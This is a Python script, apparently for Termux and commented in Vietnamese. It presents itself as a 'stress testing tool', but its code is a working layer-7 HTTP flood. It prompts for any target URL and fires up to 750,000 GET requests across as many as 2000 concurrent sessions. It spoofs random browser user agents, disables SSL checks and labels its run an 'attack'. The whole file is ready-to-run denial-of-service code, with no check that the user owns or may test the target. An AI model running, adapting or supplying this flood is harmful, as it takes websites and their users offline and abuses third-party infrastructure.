#!/usr/bin/env python3
"""
Khang Termux Layer 7 - Advanced Stress Testing Tool V2
GIỜ CÓ THỂ SET SỐ RQS CỤ THỂ!
"""

import sys
import subprocess
import os

# TỰ ĐỘNG CÀI ĐẶT DEPENDENCIES
def install_dependencies():
    required_packages = ['aiohttp', 'fake-useragent', 'colorama']
    for package in required_packages:
        try:
            if package == 'fake-useragent':
                __import__('fake_useragent')
            else:
                __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_dependencies()

import asyncio
import aiohttp
import socket
import random
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import Fore, Style, init

init(autoreset=True)

class KhangStressTesterV2:
    def __init__(self):
        self.total_requests = 0
        self.failed_requests = 0
        self.success_requests = 0
        self.running = False
        self.ua = UserAgent()
        self.lock = threading.Lock()
        self.target_requests = 0  # Số RQS mục tiêu
        self.requests_sent = 0    # Số RQS đã gửi
        
    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════╗
║    {Fore.WHITE}KHANG TERMUX LAYER 7 V2{Fore.RED}               ║
║  {Fore.YELLOW}SET SỐ RQS CHÍNH XÁC (0-750,000){Fore.RED}       ║
╚══════════════════════════════════════════╝
{Fore.CYAN}• Chỉnh được số RQS cụ thể
{Fore.CYAN}• Max: 750,000+ requests
{Fore.CYAN}• Fake User Agents
{Fore.CYAN}• Multi-threaded Async
{Style.RESET_ALL}
"""
        print(banner)
    
    def get_random_headers(self):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        }
    
    async def http_flood_with_limit(self, target_url, max_requests, threads):
        """Layer 7 với giới hạn số RQS cụ thể"""
        print(f"{Fore.GREEN}[+] Starting Layer 7 HTTP Flood...")
        print(f"{Fore.YELLOW}[*] Target: {target_url}")
        print(f"{Fore.YELLOW}[*] Max Requests: {max_requests:,}")
        print(f"{Fore.YELLOW}[*] Threads: {threads}")
        
        if max_requests > 750000:
            print(f"{Fore.RED}[!] Warning: Max 750,000 requests recommended")
            confirm = input(f"{Fore.YELLOW}[?] Continue anyway? (y/n): ")
            if confirm.lower() != 'y':
                return
        
        self.running = True
        self.target_requests = max_requests
        self.requests_sent = 0
        
        async def attack_session(session_id):
            session = aiohttp.ClientSession()
            while self.running and self.requests_sent < self.target_requests:
                try:
                    headers = self.get_random_headers()
                    async with session.get(target_url, 
                                         headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=3),
                                         ssl=False) as response:
                        with self.lock:
                            self.requests_sent += 1
                            self.total_requests += 1
                            if response.status == 200:
                                self.success_requests += 1
                            else:
                                self.failed_requests += 1
                except Exception:
                    with self.lock:
                        self.requests_sent += 1
                        self.total_requests += 1
                        self.failed_requests += 1
                
                # Kiểm tra đã đủ số request chưa
                if self.requests_sent >= self.target_requests:
                    self.running = False
                    break
                    
                # Tốc độ attack
                await asyncio.sleep(0.001)
            
            await session.close()
        
        # Tạo tasks
        tasks = []
        for i in range(min(threads, 2000)):
            task = asyncio.create_task(attack_session(i))
            tasks.append(task)
        
        # Hiển thị thống kê
        await self.show_stats_with_limit()
        
        # Chờ hoàn thành
        await asyncio.gather(*tasks)
        print(f"{Fore.GREEN}[+] Attack completed!")
    
    async def show_stats_with_limit(self):
        """Hiển thị thống kê với limit"""
        start_time = time.time()
        last_count = 0
        
        while self.running and self.requests_sent < self.target_requests:
            await asyncio.sleep(1)
            with self.lock:
                current_total = self.total_requests
                rps = current_total - last_count
                last_count = current_total
                progress = (self.requests_sent / self.target_requests) * 100
                
                # Progress bar
                bar_length = 30
                filled_length = int(bar_length * progress // 100)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)
                
                print(f"\r{Fore.CYAN}[{bar}] {progress:.1f}% | "
                      f"Sent: {self.requests_sent:,}/{self.target_requests:,} | "
                      f"RPS: {rps:,} | "
                      f"Total: {self.total_requests:,}", end="", flush=True)
        
        print(f"\n{Fore.GREEN}[✓] Target reached: {self.requests_sent:,} requests")
    
    def auto_calculate_threads(self, max_requests):
        """Tự động tính số threads dựa trên số RQS"""
        if max_requests <= 10000:
            return 100
        elif max_requests <= 50000:
            return 200
        elif max_requests <= 150000:
            return 500
        elif max_requests <= 300000:
            return 1000
        elif max_requests <= 500000:
            return 1500
        else:  # 500,000 - 750,000
            return 2000

def main():
    parser = argparse.ArgumentParser(description="Khang Termux Layer 7 V2 - Set số RQS cụ thể!")
    parser.add_argument("--url", help="Target URL (bắt buộc)")
    parser.add_argument("--requests", type=int, default=10000, help="Số RQS cần gửi (max 750,000)")
    parser.add_argument("--threads", type=int, default=0, help="Số threads (0 = auto)")
    parser.add_argument("--auto", action="store_true", help="Tự động chọn threads")
    
    args = parser.parse_args()
    
    tester = KhangStressTesterV2()
    tester.print_banner()
    
    try:
        if not args.url:
            args.url = input(f"{Fore.YELLOW}[?] Enter target URL: ")
        
        if args.requests <= 0:
            args.requests = int(input(f"{Fore.YELLOW}[?] Enter number of requests (1-750,000): "))
        
        # Giới hạn max 750,000
        if args.requests > 750000:
            print(f"{Fore.RED}[!] Maximum 750,000 requests!")
            args.requests = 750000
        
        # Tự động tính threads
        if args.auto or args.threads == 0:
            args.threads = tester.auto_calculate_threads(args.requests)
            print(f"{Fore.CYAN}[*] Auto selected: {args.threads} threads")
        
        print(f"{Fore.GREEN}[+] Configuration:")
        print(f"{Fore.YELLOW}   URL: {args.url}")
        print(f"{Fore.YELLOW}   Requests: {args.requests:,}")
        print(f"{Fore.YELLOW}   Threads: {args.threads}")
        
        confirm = input(f"{Fore.YELLOW}[?] Start attack? (y/n): ")
        if confirm.lower() == 'y':
            asyncio.run(tester.http_flood_with_limit(args.url, args.requests, args.threads))
        else:
            print(f"{Fore.RED}[!] Cancelled")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopped by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")

if __name__ == "__main__":
    main()
